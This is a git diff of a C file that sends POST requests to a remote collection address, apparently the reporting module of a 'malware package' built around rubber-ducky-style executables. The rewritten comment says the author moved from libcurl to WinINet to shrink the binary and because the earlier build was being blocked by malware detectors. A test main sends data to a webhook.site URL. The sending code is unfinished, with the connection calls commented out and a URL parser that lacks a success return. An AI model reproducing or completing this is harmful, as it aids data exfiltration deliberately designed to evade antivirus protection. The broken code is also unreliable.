@@ -1,66 +1,101 @@
 /*
     This file handles all of the potential POST requests that will be sent out by our executables.
 
-    While I originally wrote a version of this using wininet, I ultimately scratched that and decided to use libcurl for the following
-    reasons:
+    While I originally wrote a version of this using libcurl, I ultimately scratched that and decided to use WiniINet since it's not
+    "good" for a malware package to be EXTREMELY LARGE (which we had to have because static file).
 
-    1. Wininet is no longer supported by Windows (and hence, using it is extremely bad security practice)
-    2. Ducky Hoster is still under development. When this deploys, I intend to use HTTPS - and libcurl supports that
-    3. Wininet is bad at error handling
-
-    I also thought about writing the HTTPS post request from scratch, but that requires fiddling with the OpenSSL library
-    --> Which isn't really writing anything from scratch anyways
-
-    gcc ./post.c -o path.exe -lcurl -L "/Program Files/curl-8.6.0_1-win32-mingw/lib" -I "/Program Files/curl-8.6.0_1-win32-mingw/include/"
-    You need to link both the header file and the -a
+    It's getting blocked by malware detectors. Hence, we have this
 */
 
 #include <stdio.h>
 #include <string.h>
+#include <wininet.h>
+#include <windows.h>
 #include <errno.h>
-#include "curl.h"          // Compile this with libcurl as a static library
+#include "winerror.h"
 
-void send_post_request(char* address, char* text, int text_size, char* exe_type, char* auth_key)
+// typedef const wchar_t* LPCWSTR;
+// Issue is we can't define wchar_t size because it's platform dependent
+
+// gcc .\post.c -o post.exe -lwininet
+
+int parse_url(char* address, URL_COMPONENTS* url_components)
 {
-    // Initialize all sub modules because we're on Windows and might want HTTPS down the line
-    curl_global_init(CURL_GLOBAL_ALL);
+    // Zero out the struct
+    memset(url_components, 0, sizeof(*url_components));
 
-    // Init a single thread $CURL "command instance" - or at least I like to think of it as a command instance because that's how it is on Kali
-    CURL* curl_instance = curl_easy_init(); 
+    // Something they don't tell you in documentation - you're supposed to prepare a ton of stuff in url_components
+    // That's because it turns out InternetCrackURL is annoying and merely REPLACES the fields
+    // Unfortunately, we do have to malloc all of this
+    wchar_t dummy;
+    int wchar_t_size = sizeof(dummy);
 
-    // Set URL - address usually is a macro that is passed in by get_req.js at compile time
-    curl_easy_setopt(curl_instance, CURLOPT_URL, address);
+    int LPZ_SCHEME_LEN = 8;
+    int HOSTNAME_LEN = INTERNET_MAX_HOST_NAME_LENGTH;
+    int URL_PATH_LEN = 256;
+    int EXTRA_INFO_LEN = 64;
 
-    // Set headers
-    struct curl_slist* headers = NULL;
+    url_components->lpszScheme = malloc(LPZ_SCHEME_LEN * wchar_t_size);
+    url_components->dwSchemeLength = LPZ_SCHEME_LEN;
+    url_components->lpszHostName = malloc(HOSTNAME_LEN * wchar_t_size);
+    url_components->dwHostNameLength = HOSTNAME_LEN;
+    url_components->lpszUrlPath = malloc(URL_PATH_LEN * wchar_t_size);
+    url_components->dwUrlPathLength = URL_PATH_LEN;
+    url_components->lpszExtraInfo = malloc(EXTRA_INFO_LEN * wchar_t_size);
+    url_components->dwExtraInfoLength = EXTRA_INFO_LEN;
+    url_components->dwStructSize = sizeof(*url_components);
+    // url_components->dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH;
 
-    char* to_send = malloc(5 + strlen(exe_type) + 1);       // EXE type  - Add 1 for null byte
-    strcpy(to_send, "exe: ");
-    strcat(to_send, exe_type);
-    headers = curl_slist_append(headers, to_send);
+    // I don't think URLs have Unicode. Hence, we're setting this to 0
+    // This returns false if failed
+    if (!InternetCrackUrl(address, 0, ICU_ESCAPE, url_components)) 
+    {
+        print_last_error("Parsing URL failed");
+        return -1;
+    }
+}
 
-    headers = curl_slist_append(headers, "Content-Type: text/plain");         // Content Type
-    
-    // Auth
-    char* auth_send = malloc(15 + strlen(auth_key) + 1);
-    strcpy(auth_send, "authorization: ");
-    strcat(auth_send, auth_key);
-    headers = curl_slist_append(headers, auth_send);
+void free_url_components(URL_COMPONENTS* url_components)
+{
+    free(url_components->lpszScheme);
+    free(url_components->lpszHostName);
+    free(url_components->lpszUrlPath);
+    free(url_components->lpszExtraInfo);
+}
 
-    // Set headers
-    curl_easy_setopt(curl_instance, CURLOPT_HTTPHEADER, headers);
+int send_post_request(char* address, char* text, int text_size, char* exe_type, char* auth_key)
+{
+    // Before we do anything, parse the URL.
+    URL_COMPONENTS url_components;
+    parse_url(address, &url_components);
 
-    // Set data to send
-    curl_easy_setopt(curl_instance, CURLOPT_POSTFIELDS, text);
-    curl_easy_setopt(curl_instance, CURLOPT_POSTFIELDSIZE, text_size);
-    
-    // Send the POST request
-    curl_easy_perform(curl_instance);
+    puts(url_components.lpszHostName);
+    free_url_components(&url_components);
+    // Allow windows to access the internet. Use the 'W' version for unicode
+    // Error handle for no internet
+    // HINTERNET internet_connection = InternetOpen(
+    //     "", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0
+    // );
 
-    // Cleanup everything (and the POST request)
-    free(to_send);
-    free(auth_send);
-    curl_slist_free_all(headers);
-    curl_easy_cleanup(curl_instance);
-    curl_global_cleanup();
+    // if (internet_connection == NULL)
+    // {
+    //     perror("Error when sending POST request");
+    //     return -1;
+    // }
+
+    // Create a windows HTTP session
+    // HINTERNET httpSession = InternetConnect(
+    //     internet_connection,
+
+    // );
+
+    return 0;
+}
+
+int main()
+{
+    puts("hi");
+    send_post_request("https://webhook.site/90b9688d-b73c-4048-8018-558a583b5cab", "Hello World!", 12, "ENUM", "HI");
+    puts("Done!");
+    return 0;
 }
